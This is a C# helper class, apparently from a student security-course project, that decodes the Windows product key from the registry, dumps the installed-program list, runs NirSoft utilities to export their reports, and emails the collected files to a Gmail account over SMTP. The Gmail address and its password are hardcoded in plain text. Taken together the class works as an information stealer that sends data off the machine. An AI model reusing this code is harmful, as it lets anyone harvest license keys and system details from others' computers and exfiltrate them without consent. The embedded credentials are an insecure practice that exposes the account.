using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using Microsoft.Win32;

namespace TP
{
    internal class Helpers
    {
        public static void openCalc()
        {
            Process.Start("calc");
        }

        /// <summary>
        /// Enumeration that specifies DigitalProductId version
        /// </summary>
        public enum DigitalProductIdVersion
        {
            /// <summary>
            /// All systems up to Windows 7 (Windows 7 and older versions)
            /// </summary>
            UpToWindows7,
            /// <summary>
            /// Windows 8 and up (Windows 8 and newer versions)
            /// </summary>
            Windows8AndUp
        }

        public static string GetWindowsProductKeyFromRegistry()
        {
            var localKey =
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem
                    ? RegistryView.Registry64
                    : RegistryView.Registry32);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")?.GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;
            localKey.Close();
            var isWin8OrUp =
                Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2
                ||
                Environment.OSVersion.Version.Major > 6;
            return GetWindowsProductKeyFromDigitalProductId(digitalProductId,
                isWin8OrUp ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
        }

        /// <summary>
        /// Decodes Windows Product Key from DigitalProductId with specified DigitalProductId version.
        /// </summary>
        /// <param name="digitalProductId"></param>
        /// <param name="digitalProductIdVersion"></param>
        /// <returns></returns>
        public static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, DigitalProductIdVersion digitalProductIdVersion)
        {
            var productKey = digitalProductIdVersion == DigitalProductIdVersion.Windows8AndUp 
                ? DecodeProductKeyWin8AndUp(digitalProductId) 
                : DecodeProductKey(digitalProductId);
            return productKey;
        }

        private static string DecodeProductKey(byte[] digitalProductId)
        {
            const int keyStartIndex = 52;
            const int keyEndIndex = keyStartIndex + 15;
            var digits = new[]
            {
                'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R',
                'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
            };
            const int decodeLength = 29;
            const int decodeStringLength = 15;
            var decodedChars = new char[decodeLength];
            var hexPid = new ArrayList();
            for (var i = keyStartIndex; i <= keyEndIndex; i++)
            {
                hexPid.Add(digitalProductId[i]);
            }
            for (var i = decodeLength - 1; i >= 0; i--)
            {
                // Every sixth char is a separator.
                if ((i + 1) % 6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    // Do the actual decoding.
                    var digitMapIndex = 0;
                    for (var j = decodeStringLength - 1; j >= 0; j--)
                    {
                        var byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
                        hexPid[j] = (byte)(byteValue / 24);
                        digitMapIndex = byteValue % 24;
                        decodedChars[i] = digits[digitMapIndex];
                    }
                }
            }
            return new string(decodedChars);
        }

        public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
        {
            var key = String.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

            // Possible alpha-numeric characters in product key.
            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            int last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }
            var keypart1 = key.Substring(1, last);
            const string insert = "N";
            key = key.Substring(1).Replace(keypart1, keypart1 + insert);
            if (last == 0)
                key = insert + key;
            for (var i = 5; i < key.Length; i += 6)
            {
                key = key.Insert(i, "-");
            }
            return key;
        }

        public static void getProgramList()
        {
            var localKey =
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem
                    ? RegistryView.Registry64
                    : RegistryView.Registry32);

            var uninstallKey = localKey.OpenSubKey(@"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall");
            var programCodesList = uninstallKey?.GetSubKeyNames();
            if (programCodesList == null)
            {
                Console.WriteLine("Failed to get installed programs from registry");
                return;
            }

            var csvList = "";
            foreach (string programCode in programCodesList)
            {
                var programKey = uninstallKey.OpenSubKey(programCode);
                var valueNames = programKey.GetValueNames();
                foreach (string valueName in valueNames)
                {
                    var value = programKey.GetValue(valueName);
                    csvList += valueName + ": " + value + "\n";
                }
                csvList += "--------------------------------------------------------------------\n";
            }
            // Create a file to write to.
            //string createText = "Hello and Welcome" + Environment.NewLine;
            var path = @"D:\Matias\Facultad\Seguridad\TP\tp-seginf\code\TP\programList.txt";
            File.WriteAllText(path, csvList);
            return;
        }

        public static string execNirsoftTool(string executablePath)
        {
            string file = Path.GetFileNameWithoutExtension(executablePath).ToLower() + ".html";
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, executablePath);
            startInfo.Arguments = @"/shtml " + file;
            var process = Process.Start(startInfo);
            process.WaitForExit();
            return file;
        }

        public static void sendMail(string subject, string message, List<string> files)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("seginf2019@gmail.com");
            mail.To.Add("seginf2019@gmail.com");
            mail.Subject = subject;
            mail.Body = message;

            foreach (var file in files)
            {
                var attachment = new System.Net.Mail.Attachment(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file));
                mail.Attachments.Add(attachment);
            }

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("seginf2019@gmail.com", "sonrisita");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }

    }
}